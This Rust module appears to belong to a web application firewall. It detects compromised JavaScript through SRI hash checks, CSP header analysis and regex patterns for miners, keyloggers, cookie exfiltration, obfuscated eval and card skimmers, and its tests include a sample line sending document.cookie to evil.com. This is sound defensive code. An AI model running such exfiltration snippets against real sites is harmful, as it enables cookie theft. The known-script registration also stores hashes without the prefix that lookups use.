//! Supply Chain Attack Detection
//!
//! Detects and prevents supply chain attacks including:
//! - Compromised JavaScript resources
//! - Subresource Integrity (SRI) validation
//! - Content Security Policy (CSP) enforcement
//! - Suspicious script patterns in responses
//!
//! # Rule ID Ranges
//!
//! - 92000-92099: SRI violations
//! - 92100-92199: CSP violations
//! - 92200-92299: Suspicious script patterns
//! - 92300-92399: Resource integrity checks

use std::collections::{HashMap, HashSet};

use regex::Regex;
use sha2::{Digest, Sha256, Sha384, Sha512};
use std::sync::LazyLock;

use crate::detection::Detection;
use crate::rules::AttackType;

/// Supply chain protection configuration
#[derive(Debug, Clone)]
pub struct SupplyChainConfig {
    /// Enable supply chain protection
    pub enabled: bool,
    /// Enable SRI validation
    pub sri_enabled: bool,
    /// Enable suspicious pattern detection
    pub pattern_detection_enabled: bool,
    /// Enable CSP header checking
    pub csp_enabled: bool,
    /// Allowed script hashes (precomputed SRI)
    pub allowed_hashes: HashSet<String>,
    /// Allowed script domains
    pub allowed_domains: HashSet<String>,
}

impl Default for SupplyChainConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sri_enabled: true,
            pattern_detection_enabled: true,
            csp_enabled: true,
            allowed_hashes: HashSet::new(),
            allowed_domains: HashSet::new(),
        }
    }
}

/// Supply chain protector
pub struct SupplyChainProtector {
    config: SupplyChainConfig,
    /// Known good script hashes
    known_good_hashes: HashMap<String, ScriptInfo>,
    /// Suspicious patterns in scripts
    suspicious_patterns: Vec<(Regex, &'static str, u8)>,
}

/// Information about a known script
#[derive(Debug, Clone)]
pub struct ScriptInfo {
    /// Name/identifier
    pub name: String,
    /// Source URL
    pub source: String,
    /// Version
    pub version: Option<String>,
    /// SHA-256 hash
    pub sha256: String,
    /// SHA-384 hash (for SRI)
    pub sha384: Option<String>,
}

// Suspicious patterns that might indicate compromised scripts
static SUSPICIOUS_SCRIPT_PATTERNS: LazyLock<Vec<(Regex, &'static str, u8)>> = LazyLock::new(|| {
    vec![
        // Crypto mining
        (
            Regex::new(r"(?i)coinhive|cryptonight|minero\.cc|coinimp").unwrap(),
            "Cryptocurrency miner",
            9,
        ),
        (
            Regex::new(r"(?i)wasm.*mining|webminer|coin-?hive").unwrap(),
            "WebAssembly miner",
            9,
        ),
        // Credential stealing
        (
            Regex::new(r"(?i)keylog|keystroke|capture.*key").unwrap(),
            "Keylogger pattern",
            8,
        ),
        (
            Regex::new(r"(?i)password.*exfil|cred.*steal").unwrap(),
            "Credential stealing",
            9,
        ),
        // Data exfiltration
        (
            Regex::new(r#"(?i)\.send\(\s*document\.cookie"#).unwrap(),
            "Cookie exfiltration",
            8,
        ),
        (
            Regex::new(r#"(?i)localStorage\s*\+.*fetch|fetch.*localStorage"#).unwrap(),
            "Storage exfiltration",
            7,
        ),
        // Malicious redirects
        (
            Regex::new(r#"(?i)window\.location\s*=\s*['"]https?://"#).unwrap(),
            "External redirect",
            5,
        ),
        // Obfuscation patterns
        (
            Regex::new(r#"eval\s*\(\s*atob\s*\("#).unwrap(),
            "Base64 eval",
            7,
        ),
        (
            Regex::new(r#"eval\s*\(\s*String\.fromCharCode"#).unwrap(),
            "CharCode eval",
            7,
        ),
        (
            Regex::new(r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}").unwrap(),
            "Hex-encoded payload",
            6,
        ),
        // Suspicious function patterns
        (
            Regex::new(r#"(?i)new\s+Function\s*\(\s*['"]"#).unwrap(),
            "Dynamic function creation",
            5,
        ),
        (
            Regex::new(r#"(?i)document\.write\s*\(\s*unescape"#).unwrap(),
            "Unescape write",
            6,
        ),
        // Iframe injection
        (
            Regex::new(r#"(?i)createElement\s*\(\s*['"]iframe['"]"#).unwrap(),
            "Dynamic iframe",
            5,
        ),
        (
            Regex::new(r"(?i)srcdoc\s*=.*<script").unwrap(),
            "Iframe script injection",
            7,
        ),
        // Known malicious patterns
        (
            Regex::new(r"(?i)magecart|skimmer|formjack").unwrap(),
            "Known skimmer",
            10,
        ),
        (
            Regex::new(r"(?i)payment.*form.*capture|card.*data.*send").unwrap(),
            "Payment capture",
            9,
        ),
    ]
});

impl SupplyChainProtector {
    /// Create a new supply chain protector
    pub fn new(config: SupplyChainConfig) -> Self {
        Self {
            config,
            known_good_hashes: HashMap::new(),
            suspicious_patterns: SUSPICIOUS_SCRIPT_PATTERNS.clone(),
        }
    }

    /// Register a known good script hash
    pub fn register_known_script(&mut self, info: ScriptInfo) {
        self.known_good_hashes.insert(info.sha256.clone(), info);
    }

    /// Compute SHA-256 hash of content
    pub fn compute_sha256(content: &[u8]) -> String {
        let mut hasher = Sha256::new();
        hasher.update(content);
        let result = hasher.finalize();
        format!("sha256-{}", base64_encode(&result))
    }

    /// Compute SHA-384 hash of content (for SRI)
    pub fn compute_sha384(content: &[u8]) -> String {
        let mut hasher = Sha384::new();
        hasher.update(content);
        let result = hasher.finalize();
        format!("sha384-{}", base64_encode(&result))
    }

    /// Compute SHA-512 hash of content
    pub fn compute_sha512(content: &[u8]) -> String {
        let mut hasher = Sha512::new();
        hasher.update(content);
        let result = hasher.finalize();
        format!("sha512-{}", base64_encode(&result))
    }

    /// Check script content for suspicious patterns
    pub fn check_script_content(&self, content: &str) -> Vec<Detection> {
        if !self.config.enabled || !self.config.pattern_detection_enabled {
            return Vec::new();
        }

        let mut detections = Vec::new();

        for (pattern, name, score) in &self.suspicious_patterns {
            if pattern.is_match(content) {
                detections.push(Detection {
                    rule_id: 92200,
                    rule_name: format!("Suspicious Script: {}", name),
                    attack_type: AttackType::Xss,
                    matched_value: format!("Pattern: {}", name),
                    location: "response_body".to_string(),
                    base_score: *score as u32,
                    tags: vec![
                        "supplychain".to_string(),
                        "script".to_string(),
                        "suspicious".to_string(),
                    ],
                });
            }
        }

        detections
    }

    /// Validate script hash against known good hashes
    pub fn validate_script_hash(&self, content: &[u8]) -> ScriptValidation {
        if !self.config.enabled || !self.config.sri_enabled {
            return ScriptValidation::NotChecked;
        }

        let hash = Self::compute_sha256(content);

        // Check against configured allowed hashes
        if self.config.allowed_hashes.contains(&hash) {
            return ScriptValidation::Allowed;
        }

        // Check against known good scripts
        if let Some(info) = self.known_good_hashes.get(&hash) {
            return ScriptValidation::KnownGood(info.clone());
        }

        ScriptValidation::Unknown(hash)
    }

    /// Check SRI attribute validity
    pub fn check_sri_attribute(&self, sri: &str, content: &[u8]) -> SriValidation {
        if !self.config.enabled || !self.config.sri_enabled {
            return SriValidation::NotChecked;
        }

        // Parse SRI format: "sha384-xxx" or "sha256-xxx sha384-yyy"
        let parts: Vec<&str> = sri.split_whitespace().collect();

        for part in parts {
            if let Some((algo, expected)) = part.split_once('-') {
                let computed = match algo {
                    "sha256" => Self::compute_sha256(content),
                    "sha384" => Self::compute_sha384(content),
                    "sha512" => Self::compute_sha512(content),
                    _ => continue,
                };

                let computed_hash = computed.split_once('-').map(|(_, h)| h).unwrap_or("");

                if computed_hash == expected {
                    return SriValidation::Valid;
                }
            }
        }

        SriValidation::Invalid {
            expected: sri.to_string(),
            computed: Self::compute_sha384(content),
        }
    }

    /// Check response for supply chain issues
    pub fn check_response(&self, content: &str, content_type: Option<&str>) -> Vec<Detection> {
        if !self.config.enabled {
            return Vec::new();
        }

        let mut detections = Vec::new();

        // Only check JavaScript content
        let is_script = content_type
            .map(|ct| {
                ct.contains("javascript")
                    || ct.contains("ecmascript")
                    || ct.contains("application/x-javascript")
            })
            .unwrap_or(false);

        if is_script || content.contains("<script") {
            detections.extend(self.check_script_content(content));
        }

        // Check for inline script in HTML
        if content_type.map(|ct| ct.contains("html")).unwrap_or(false) {
            detections.extend(self.check_inline_scripts(content));
        }

        detections
    }

    /// Check HTML for suspicious inline scripts
    fn check_inline_scripts(&self, html: &str) -> Vec<Detection> {
        let mut detections = Vec::new();

        // Simple script tag extraction
        let script_pattern = Regex::new(r"(?is)<script[^>]*>(.*?)</script>").unwrap();

        for cap in script_pattern.captures_iter(html) {
            if let Some(script_content) = cap.get(1) {
                let script = script_content.as_str();
                let script_detections = self.check_script_content(script);
                detections.extend(script_detections);
            }
        }

        detections
    }

    /// Parse and validate Content-Security-Policy header
    pub fn check_csp_header(&self, csp: &str) -> Vec<CspIssue> {
        if !self.config.enabled || !self.config.csp_enabled {
            return Vec::new();
        }

        let mut issues = Vec::new();

        // Check for unsafe directives
        if csp.contains("'unsafe-inline'") {
            issues.push(CspIssue {
                directive: "script-src".to_string(),
                issue: "Contains 'unsafe-inline' which allows inline scripts".to_string(),
                severity: CspSeverity::Medium,
            });
        }

        if csp.contains("'unsafe-eval'") {
            issues.push(CspIssue {
                directive: "script-src".to_string(),
                issue: "Contains 'unsafe-eval' which allows eval()".to_string(),
                severity: CspSeverity::High,
            });
        }

        // Check for overly permissive directives
        if csp.contains("script-src *") || csp.contains("script-src 'self' *") {
            issues.push(CspIssue {
                directive: "script-src".to_string(),
                issue: "Allows scripts from any source".to_string(),
                severity: CspSeverity::Critical,
            });
        }

        if csp.contains("default-src *") {
            issues.push(CspIssue {
                directive: "default-src".to_string(),
                issue: "Allows resources from any source".to_string(),
                severity: CspSeverity::High,
            });
        }

        // Check for missing important directives
        if !csp.contains("script-src") && !csp.contains("default-src") {
            issues.push(CspIssue {
                directive: "script-src".to_string(),
                issue: "Missing script-src directive".to_string(),
                severity: CspSeverity::Medium,
            });
        }

        issues
    }

    /// Get statistics
    pub fn stats(&self) -> SupplyChainStats {
        SupplyChainStats {
            known_good_scripts: self.known_good_hashes.len(),
            suspicious_patterns: self.suspicious_patterns.len(),
            allowed_hashes: self.config.allowed_hashes.len(),
            allowed_domains: self.config.allowed_domains.len(),
        }
    }
}

impl Default for SupplyChainProtector {
    fn default() -> Self {
        Self::new(SupplyChainConfig::default())
    }
}

/// Result of script validation
#[derive(Debug, Clone)]
pub enum ScriptValidation {
    /// Not checked (feature disabled)
    NotChecked,
    /// Script is in allowed list
    Allowed,
    /// Script matches a known good hash
    KnownGood(ScriptInfo),
    /// Script hash is unknown
    Unknown(String),
}

/// Result of SRI validation
#[derive(Debug, Clone)]
pub enum SriValidation {
    /// Not checked
    NotChecked,
    /// SRI matches
    Valid,
    /// SRI doesn't match
    Invalid { expected: String, computed: String },
}

/// CSP issue
#[derive(Debug, Clone)]
pub struct CspIssue {
    pub directive: String,
    pub issue: String,
    pub severity: CspSeverity,
}

/// CSP issue severity
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CspSeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

/// Statistics about supply chain protection
#[derive(Debug, Clone)]
pub struct SupplyChainStats {
    pub known_good_scripts: usize,
    pub suspicious_patterns: usize,
    pub allowed_hashes: usize,
    pub allowed_domains: usize,
}

/// Base64 encode helper
fn base64_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(data)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hash_computation() {
        let content = b"console.log('hello');";
        let hash = SupplyChainProtector::compute_sha256(content);
        assert!(hash.starts_with("sha256-"));
    }

    #[test]
    fn test_sri_validation() {
        let protector = SupplyChainProtector::default();
        let content = b"console.log('test');";

        // Compute correct hash
        let correct_sri = SupplyChainProtector::compute_sha384(content);

        let result = protector.check_sri_attribute(&correct_sri, content);
        assert!(matches!(result, SriValidation::Valid));

        // Wrong hash
        let result = protector.check_sri_attribute("sha384-wronghash", content);
        assert!(matches!(result, SriValidation::Invalid { .. }));
    }

    #[test]
    fn test_crypto_miner_detection() {
        let protector = SupplyChainProtector::default();

        let malicious_scripts = vec![
            "var miner = new CoinHive.Anonymous('site-key');",
            "import CryptoNight from 'crypto'",
            "// coinimp initialization",
        ];

        for script in malicious_scripts {
            let detections = protector.check_script_content(script);
            assert!(
                !detections.is_empty(),
                "Should detect crypto miner in: {}",
                script
            );
        }
    }

    #[test]
    fn test_keylogger_detection() {
        let protector = SupplyChainProtector::default();

        let script = "document.addEventListener('keydown', function(e) { keylog(e); });";
        let detections = protector.check_script_content(script);
        assert!(!detections.is_empty());
    }

    #[test]
    fn test_cookie_exfil_detection() {
        let protector = SupplyChainProtector::default();

        let script = "fetch('http://evil.com').send(document.cookie)";
        let detections = protector.check_script_content(script);
        assert!(!detections.is_empty());
    }

    #[test]
    fn test_obfuscation_detection() {
        let protector = SupplyChainProtector::default();

        let scripts = vec![
            "eval(atob('YWxlcnQoMSk='))",
            "eval(String.fromCharCode(97,108,101,114,116))",
        ];

        for script in scripts {
            let detections = protector.check_script_content(script);
            assert!(
                !detections.is_empty(),
                "Should detect obfuscation in: {}",
                script
            );
        }
    }

    #[test]
    fn test_clean_script() {
        let protector = SupplyChainProtector::default();

        let clean_scripts = vec![
            "console.log('hello world');",
            "function add(a, b) { return a + b; }",
            "document.getElementById('btn').addEventListener('click', handler);",
        ];

        for script in clean_scripts {
            let detections = protector.check_script_content(script);
            assert!(
                detections.is_empty(),
                "Should not flag clean script: {}",
                script
            );
        }
    }

    #[test]
    fn test_csp_check() {
        let protector = SupplyChainProtector::default();

        // Unsafe CSP
        let issues = protector.check_csp_header("script-src 'self' 'unsafe-inline' 'unsafe-eval'");
        assert!(!issues.is_empty());
        assert!(issues.iter().any(|i| i.issue.contains("unsafe-inline")));
        assert!(issues.iter().any(|i| i.issue.contains("unsafe-eval")));

        // Overly permissive
        let issues = protector.check_csp_header("script-src *");
        assert!(issues.iter().any(|i| i.severity == CspSeverity::Critical));

        // Good CSP
        let issues = protector.check_csp_header("script-src 'self'; object-src 'none'");
        assert!(issues.is_empty());
    }

    #[test]
    fn test_inline_script_detection() {
        let protector = SupplyChainProtector::default();

        let html = r#"
            <html>
            <head>
                <script>
                    eval(atob('bWFsaWNpb3Vz'))
                </script>
            </head>
            <body>Hello</body>
            </html>
        "#;

        let detections = protector.check_response(html, Some("text/html"));
        assert!(!detections.is_empty());
    }

    #[test]
    fn test_register_known_script() {
        let mut protector = SupplyChainProtector::default();

        let content = b"function trusted() {}";
        let hash = SupplyChainProtector::compute_sha256(content);
        let hash_value = hash.split_once('-').map(|(_, h)| h).unwrap_or("");

        protector.register_known_script(ScriptInfo {
            name: "trusted.js".to_string(),
            source: "https://example.com/trusted.js".to_string(),
            version: Some("1.0.0".to_string()),
            sha256: hash_value.to_string(),
            sha384: None,
        });

        assert_eq!(protector.stats().known_good_scripts, 1);
    }

    #[test]
    fn test_magecart_detection() {
        let protector = SupplyChainProtector::default();

        let script = "// magecart skimmer v2";
        let detections = protector.check_script_content(script);
        assert!(!detections.is_empty());
        assert!(detections[0].base_score >= 9);
    }
}
